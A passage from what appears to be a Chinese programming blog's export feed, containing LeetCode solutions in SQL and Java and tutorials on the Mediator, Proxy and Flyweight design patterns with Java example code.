800   |</span><br><span class="line">| 3         | 3          | 4        | 2019-05-13 | 2        | 2800  |</span><br><span class="line">+-----------+------------+----------+------------+----------+-------+</span><br><span class="line"></span><br><span class="line">Result 表：</span><br><span class="line">+-------------+</span><br><span class="line">| seller_id   |</span><br><span class="line">+-------------+</span><br><span class="line">| 1           |</span><br><span class="line">| 3           |</span><br><span class="line">+-------------+</span><br><span class="line">Id 为 1 和 3 的销售者，销售总金额都为最高的 2800。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>子查询</p>
<h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> seller_id <span class="keyword">from</span> Sales <span class="keyword">group</span> <span class="keyword">by</span> seller_id <span class="keyword">having</span> <span class="keyword">sum</span>(price) = </span><br><span class="line">(<span class="keyword">select</span> <span class="keyword">sum</span>(price) <span class="keyword">as</span> sumCount <span class="keyword">from</span>  Sales  <span class="keyword">group</span> <span class="keyword">by</span>  seller_id <span class="keyword">order</span> <span class="keyword">by</span> sumCount <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">1</span>)</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>1085. 最小元素各数位之和</title>
    <url>/2020/04/10/LeetCode/leetcode-001085-%E6%9C%80%E5%B0%8F%E5%85%83%E7%B4%A0%E5%90%84%E6%95%B0%E4%BD%8D%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个正整数的数组 <code>A</code>。</p>
<p>然后计算 <code>S</code>，使其等于数组 <code>A</code> 当中最小的那个元素各个数位上数字之和。</p>
<p>最后，假如 <code>S</code> 所得计算结果是 <strong>奇数</strong> 的请你返回 0，否则请返回 1</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[34,23,1,24,75,33,54,8]</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">最小元素为 1，该元素各个数位上的数字之和 S &#x3D; 1，是奇数所以答案为 0。</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[99,77,33,66,55]</span><br><span class="line">输出：1</span><br><span class="line">解释：</span><br><span class="line">最小元素为 33，该元素各个数位上的数字之和 S &#x3D; 3 + 3 &#x3D; 6，是偶数所以答案为 1。</span><br></pre></td></tr></table></figure>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示:"></a>提示:</h2><ul>
<li><code>1 &lt;= A.length &lt;= 100</code></li>
<li><code>1 &lt;= A[i].length &lt;= 100</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>遍历找到最小值，求位数和判断</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">sumOfDigits</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> min = Integer.MAX_VALUE;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> num : A) &#123;</span><br><span class="line">			<span class="keyword">if</span> (min &gt; num) &#123;</span><br><span class="line">				min = num;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (min &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			count += min % <span class="number">10</span>;</span><br><span class="line">			min /= <span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span> == count % <span class="number">2</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>排序找到最小值，求位数和判断</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public int sumOfDigits(int[] A) &#123;</span><br><span class="line">		Arrays.sort(A);</span><br><span class="line">        int min &#x3D; A[0];</span><br><span class="line">		</span><br><span class="line">		int count &#x3D; 0;</span><br><span class="line">		while (min &gt; 0) &#123;</span><br><span class="line">			count +&#x3D; min % 10;</span><br><span class="line">			min &#x2F;&#x3D; 10;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		return 0 &#x3D;&#x3D; count % 2 ? 1 : 0;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-中介者模式</title>
    <url>/2020/04/10/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E4%B8%AD%E4%BB%8B%E8%80%85%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="中介者模式"><a href="#中介者模式" class="headerlink" title="中介者模式"></a>中介者模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>中介者模式（Mediator Pattern）是用来降低多个对象和类之间的通信复杂性。这种模式提供了一个中介类，该类通常处理不同类之间的通信，并支持松耦合，使代码易于维护。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-10-mediator1.png" alt="中介者模式类图"></p>
<h3 id="Mediator"><a href="#Mediator" class="headerlink" title="Mediator"></a>Mediator</h3><p>负责定义了与Colleague角色进行通信和做出决定的接口</p>
<h3 id="ConcreteMediator-具体的仲裁者、中介者"><a href="#ConcreteMediator-具体的仲裁者、中介者" class="headerlink" title="ConcreteMediator(具体的仲裁者、中介者)"></a>ConcreteMediator(具体的仲裁者、中介者)</h3><p>负责实现Mediator接口，负责实际做出决定。</p>
<h3 id="Colleague（同事）"><a href="#Colleague（同事）" class="headerlink" title="Colleague（同事）"></a>Colleague（同事）</h3><p>负责定义与Mediator进行通信的接口</p>
<h3 id="ConcreteColleague（具体的同时）"><a href="#ConcreteColleague（具体的同时）" class="headerlink" title="ConcreteColleague（具体的同时）"></a>ConcreteColleague（具体的同时）</h3><p>负责实现Colleague的接口。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-10-mediator2.png" alt="中介者模式示例类图"></p>
<h3 id="Colleague"><a href="#Colleague" class="headerlink" title="Colleague"></a>Colleague</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Colleague</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">setMediator</span><span class="params">(Mediator mediator)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">setColleagueEnabled</span><span class="params">(<span class="keyword">boolean</span> enabled)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ColleagueButton"><a href="#ColleagueButton" class="headerlink" title="ColleagueButton"></a>ColleagueButton</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ColleagueButton</span> <span class="keyword">extends</span> <span class="title">Button</span> <span class="keyword">implements</span> <span class="title">Colleague</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Mediator mediator;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ColleagueButton</span><span class="params">(String caption)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(caption);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMediator</span><span class="params">(Mediator mediator)</span> </span>&#123;            </span><br><span class="line">        <span class="keyword">this</span>.mediator = mediator;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setColleagueEnabled</span><span class="params">(<span class="keyword">boolean</span> enabled)</span> </span>&#123;      </span><br><span class="line">        setEnabled(enabled);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ColleagueCheckbox"><a href="#ColleagueCheckbox" class="headerlink" title="ColleagueCheckbox"></a>ColleagueCheckbox</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ColleagueCheckbox</span> <span class="keyword">extends</span> <span class="title">Checkbox</span> <span class="keyword">implements</span> <span class="title">ItemListener</span>, <span class="title">Colleague</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Mediator mediator;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ColleagueCheckbox</span><span class="params">(String caption, CheckboxGroup group, <span class="keyword">boolean</span> state)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">super</span>(caption, group, state);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMediator</span><span class="params">(Mediator mediator)</span> </span>&#123;            </span><br><span class="line">        <span class="keyword">this</span>.mediator = mediator;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setColleagueEnabled</span><span class="params">(<span class="keyword">boolean</span> enabled)</span> </span>&#123;      </span><br><span class="line">        setEnabled(enabled);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">itemStateChanged</span><span class="params">(ItemEvent e)</span> </span>&#123;             </span><br><span class="line">        mediator.colleagueChanged();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ColleagueTextField"><a href="#ColleagueTextField" class="headerlink" title="ColleagueTextField"></a>ColleagueTextField</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class ColleagueTextField extends TextField implements TextListener, Colleague &#123;</span><br><span class="line">    private Mediator mediator;</span><br><span class="line">    public ColleagueTextField(String text, int columns) &#123;   </span><br><span class="line">        super(text, columns);</span><br><span class="line">    &#125;</span><br><span class="line">    public void setMediator(Mediator mediator) &#123;            </span><br><span class="line">        this.mediator &#x3D; mediator;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setColleagueEnabled(boolean enabled) &#123;      </span><br><span class="line">        setEnabled(enabled);</span><br><span class="line">        setBackground(enabled ? Color.white : Color.lightGray);</span><br><span class="line">    &#125;</span><br><span class="line">    public void textValueChanged(TextEvent e) &#123;             </span><br><span class="line">        mediator.colleagueChanged();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="LoginFrame"><a href="#LoginFrame" class="headerlink" title="LoginFrame"></a>LoginFrame</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFrame</span> <span class="keyword">extends</span> <span class="title">Frame</span> <span class="keyword">implements</span> <span class="title">ActionListener</span>, <span class="title">Mediator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ColleagueCheckbox checkGuest;</span><br><span class="line">    <span class="keyword">private</span> ColleagueCheckbox checkLogin;</span><br><span class="line">    <span class="keyword">private</span> ColleagueTextField textUser;</span><br><span class="line">    <span class="keyword">private</span> ColleagueTextField textPass;</span><br><span class="line">    <span class="keyword">private</span> ColleagueButton buttonOk;</span><br><span class="line">    <span class="keyword">private</span> ColleagueButton buttonCancel;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LoginFrame</span><span class="params">(String title)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(title);</span><br><span class="line">        setBackground(Color.lightGray);</span><br><span class="line">        setLayout(<span class="keyword">new</span> GridLayout(<span class="number">4</span>, <span class="number">2</span>));</span><br><span class="line">        createColleagues();</span><br><span class="line">        add(checkGuest);</span><br><span class="line">        add(checkLogin);</span><br><span class="line">        add(<span class="keyword">new</span> Label(<span class="string">"Username:"</span>));</span><br><span class="line">        add(textUser);</span><br><span class="line">        add(<span class="keyword">new</span> Label(<span class="string">"Password:"</span>));</span><br><span class="line">        add(textPass);</span><br><span class="line">        add(buttonOk);</span><br><span class="line">        add(buttonCancel);</span><br><span class="line">        colleagueChanged();</span><br><span class="line">        pack();</span><br><span class="line">        show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">createColleagues</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        CheckboxGroup g = <span class="keyword">new</span> CheckboxGroup();</span><br><span class="line">        checkGuest = <span class="keyword">new</span> ColleagueCheckbox(<span class="string">"Guest"</span>, g, <span class="keyword">true</span>);</span><br><span class="line">        checkLogin = <span class="keyword">new</span> ColleagueCheckbox(<span class="string">"Login"</span>, g, <span class="keyword">false</span>);</span><br><span class="line">        textUser = <span class="keyword">new</span> ColleagueTextField(<span class="string">""</span>, <span class="number">10</span>);</span><br><span class="line">        textPass = <span class="keyword">new</span> ColleagueTextField(<span class="string">""</span>, <span class="number">10</span>);</span><br><span class="line">        textPass.setEchoChar(<span class="string">'*'</span>);</span><br><span class="line">        buttonOk = <span class="keyword">new</span> ColleagueButton(<span class="string">"OK"</span>);</span><br><span class="line">        buttonCancel = <span class="keyword">new</span> ColleagueButton(<span class="string">"Cancel"</span>);</span><br><span class="line">        checkGuest.setMediator(<span class="keyword">this</span>);</span><br><span class="line">        checkLogin.setMediator(<span class="keyword">this</span>);</span><br><span class="line">        textUser.setMediator(<span class="keyword">this</span>);</span><br><span class="line">        textPass.setMediator(<span class="keyword">this</span>);</span><br><span class="line">        buttonOk.setMediator(<span class="keyword">this</span>);</span><br><span class="line">        buttonCancel.setMediator(<span class="keyword">this</span>);</span><br><span class="line">        checkGuest.addItemListener(checkGuest);</span><br><span class="line">        checkLogin.addItemListener(checkLogin);</span><br><span class="line">        textUser.addTextListener(textUser);</span><br><span class="line">        textPass.addTextListener(textPass);</span><br><span class="line">        buttonOk.addActionListener(<span class="keyword">this</span>);</span><br><span class="line">        buttonCancel.addActionListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">colleagueChanged</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (checkGuest.getState()) &#123; <span class="comment">// Guest mode</span></span><br><span class="line">            textUser.setColleagueEnabled(<span class="keyword">false</span>);</span><br><span class="line">            textPass.setColleagueEnabled(<span class="keyword">false</span>);</span><br><span class="line">            buttonOk.setColleagueEnabled(<span class="keyword">true</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// Login mode</span></span><br><span class="line">            textUser.setColleagueEnabled(<span class="keyword">true</span>);</span><br><span class="line">            userpassChanged();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">userpassChanged</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (textUser.getText().length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            textPass.setColleagueEnabled(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (textPass.getText().length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                buttonOk.setColleagueEnabled(<span class="keyword">true</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                buttonOk.setColleagueEnabled(<span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            textPass.setColleagueEnabled(<span class="keyword">false</span>);</span><br><span class="line">            buttonOk.setColleagueEnabled(<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">        System.out.println(e.toString());</span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Mediator-1"><a href="#Mediator-1" class="headerlink" title="Mediator"></a>Mediator</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Mediator</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">createColleagues</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">colleagueChanged</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> LoginFrame(<span class="string">"Mediator Sample"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>中介者模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-代理模式</title>
    <url>/2020/04/10/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>在代理模式（Proxy Pattern）中，一个类代表另一个类的功能。</p>
<p>在代理模式中，我们创建具有现有对象的对象，以便向外界提供功能接口。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-10-proxy1.png" alt="代理模式类图"></p>
<h3 id="Subject-主体"><a href="#Subject-主体" class="headerlink" title="Subject(主体)"></a>Subject(主体)</h3><p>定义了是Proxy和RealSubject之间具有一致性的接口。由于存在Subject，所以Client不必在意它所使用的究竟是Proxy还是RealSubject。</p>
<h3 id="Proxy（代理人）"><a href="#Proxy（代理人）" class="headerlink" title="Proxy（代理人）"></a>Proxy（代理人）</h3><p>会尽量处理来自Client的请求。只有当自己不能处理时，它才会将工作交给RealSubject。Proxy只有在必要时才会生成RealSubject。Proxy实现了在Subject中定义的接口。</p>
<h3 id="RealSubject（实际的主体）"><a href="#RealSubject（实际的主体）" class="headerlink" title="RealSubject（实际的主体）"></a>RealSubject（实际的主体）</h3><p>“本人”RealSubject会在“代理人”Proxy无法胜任工作时出厂。它与Proxy一样，也实现了在Subject中定义的接口。</p>
<h3 id="Client（请求者）"><a href="#Client（请求者）" class="headerlink" title="Client（请求者）"></a>Client（请求者）</h3><p>使用Proxy的角色</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-10-proxy2.png" alt="代理模式示例类图"></p>
<h3 id="Printer"><a href="#Printer" class="headerlink" title="Printer"></a>Printer</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Printer</span> <span class="keyword">implements</span> <span class="title">Printable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Printer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        heavyJob(<span class="string">"123"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Printer</span><span class="params">(String name)</span> </span>&#123;                   </span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        heavyJob(<span class="string">"456("</span> + name + <span class="string">")"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPrinterName</span><span class="params">(String name)</span> </span>&#123;       </span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPrinterName</span><span class="params">()</span> </span>&#123;                </span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String string)</span> </span>&#123;              </span><br><span class="line">        System.out.println(<span class="string">"=== "</span> + name + <span class="string">" ==="</span>);</span><br><span class="line">        System.out.println(string);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">heavyJob</span><span class="params">(String msg)</span> </span>&#123;             </span><br><span class="line">        System.out.print(msg);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.print(<span class="string">"."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"789"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Printable"><a href="#Printable" class="headerlink" title="Printable"></a>Printable</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Printable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">setPrinterName</span><span class="params">(String name)</span></span>;   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">getPrinterName</span><span class="params">()</span></span>;           </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String string)</span></span>;          </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PrinterProxy"><a href="#PrinterProxy" class="headerlink" title="PrinterProxy"></a>PrinterProxy</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrinterProxy</span> <span class="keyword">implements</span> <span class="title">Printable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;            </span><br><span class="line">    <span class="keyword">private</span> Printer real;           </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PrinterProxy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PrinterProxy</span><span class="params">(String name)</span> </span>&#123;      </span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">setPrinterName</span><span class="params">(String name)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span> (real != <span class="keyword">null</span>) &#123;</span><br><span class="line">            real.setPrinterName(name);  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPrinterName</span><span class="params">()</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String string)</span> </span>&#123;  </span><br><span class="line">        realize();</span><br><span class="line">        real.print(string);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">realize</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">        <span class="keyword">if</span> (real == <span class="keyword">null</span>) &#123;</span><br><span class="line">            real = <span class="keyword">new</span> Printer(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Printable p = <span class="keyword">new</span> PrinterProxy(<span class="string">"Alice"</span>);</span><br><span class="line">        System.out.println(<span class="string">"123"</span> + p.getPrinterName() + <span class="string">"4"</span>);</span><br><span class="line">        p.setPrinterName(<span class="string">"Bob"</span>);</span><br><span class="line">        System.out.println(<span class="string">"567"</span> + p.getPrinterName() + <span class="string">"8"</span>);</span><br><span class="line">        p.print(<span class="string">"Hello, world."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>代理模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-享元模式</title>
    <url>/2020/04/10/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="享元模式"><a href="#享元模式" class="headerlink" title="享元模式"></a>享元模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>享元模式（Flyweight Pattern）主要用于减少创建对象的数量，以减少内存占用和提高性能。它提供了减少对象数量从而改善应用所需的对象结构的方式。</p>
<p>享元模式尝试重用现有的同类对象，如果未找到匹配的对象，则创建新对象。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-10-flyweight1.png" alt="享元模式类图"></p>
<h3 id="Flyweight（轻量级）"><a href="#Flyweight（轻量级）" class="headerlink" title="Flyweight（轻量级）"></a>Flyweight（轻量级）</h3><p>按照通常方式编写程序会导致程序变重，所以如果能够共享示例会比较好，而Flyweight表示的就是那些实例会被共享的类。</p>
<h3 id="FlyweightFactory（轻量级工厂）"><a href="#FlyweightFactory（轻量级工厂）" class="headerlink" title="FlyweightFactory（轻量级工厂）"></a>FlyweightFactory（轻量级工厂）</h3><p>FlyweightFactory是生成Flyweight的工厂，在工厂中生成Flyweight可以实现共享实例</p>
<h3 id="Client（请求者）"><a href="#Client（请求者）" class="headerlink" title="Client（请求者）"></a>Client（请求者）</h3><p>使用FlyweightFactory来生成Flyweight。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-10-flyweight2.png" alt="享元模式示例类图"></p>
